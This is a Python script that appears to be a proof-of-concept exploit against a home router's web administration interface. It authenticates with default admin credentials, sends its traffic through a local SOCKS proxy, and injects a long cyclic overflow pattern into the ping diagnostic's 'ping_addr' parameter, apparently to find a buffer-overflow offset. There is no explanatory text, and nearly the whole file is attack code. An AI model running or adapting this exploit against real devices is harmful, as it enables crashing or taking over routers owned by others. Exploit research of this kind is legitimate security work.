# -*- coding:utf-8 _*-
import urllib
import base64
import hashlib
import requests

import socks, socket
socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9999)
socket.socket = socks.socksocket
session = requests.Session()
session.verify = False

def login(ip, user, pwd):
    hash = hashlib.md5()
    hash.update(pwd)
    auth_string = "%s:%s" % (user, hash.hexdigest())
    encoded_string = base64.b64encode(auth_string)
    encoded_string = urllib.quote(" " + encoded_string)
    print(encoded_string)

    headers={"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Referer": "http://192.168.0.1/",
            "Cookie": "Authorization=Basic%s" % encoded_string,
            "Upgrade-Insecure-Requests": "1"}
    params = {"Save": "Save"}
    url = "http://" + ip + "/userRpm/LoginRpm.htm"
    resp = session.get(url, params=params, headers=headers, timeout=10)
    url = "http://%s/%s/userRpm" % (ip, (resp.text).split("=")[2].split("/")[3])
    cookie = "Authorization=Basic%s" % encoded_string
    return url, cookie

def exploit(url, auth):
    test = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AA" \
           "KAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"#200
    params = {'ping_addr': test,
              'doType':'ping',
              'isNew':'new',
              'sendNum':'20',
              'pSize':'64',
              'overTime':'800',
              'trHops':'20'}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "close",
               "Referer": "%s" % url,
               "Cookie": auth,
               "Upgrade-Insecure-Requests": "1"}

    resp = session.get(url, params=params, headers=headers)
    print(resp.text)

url, auth = login("192.168.2.2", "admin", "admin")
print(url + "/PingIframeRpm.htm")
print(auth)
exploit(url + "/PingIframeRpm.htm", auth)
